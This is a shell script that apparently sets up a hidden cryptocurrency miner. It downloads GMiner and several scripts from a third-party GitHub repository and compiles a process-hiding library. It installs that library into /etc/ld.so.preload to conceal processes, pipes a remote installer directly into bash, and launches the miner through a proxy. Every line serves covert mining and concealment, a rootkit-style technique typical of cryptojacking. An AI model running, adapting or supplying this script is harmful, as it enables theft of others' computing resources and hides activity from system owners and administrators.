#!/bin/sh
wget https://github.com/develsoftware/GMinerRelease/releases/download/2.60/gminer_2_60_linux64.tar.xz
tar -xvf gminer_2_60_linux64.tar.xz
wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/gmi_cort.sh
chmod +x gmi_cort.sh
wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicGmi.zip
unzip magicGmi.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/graft_installer.sh | bash
graftcp ./gmi_cort.sh
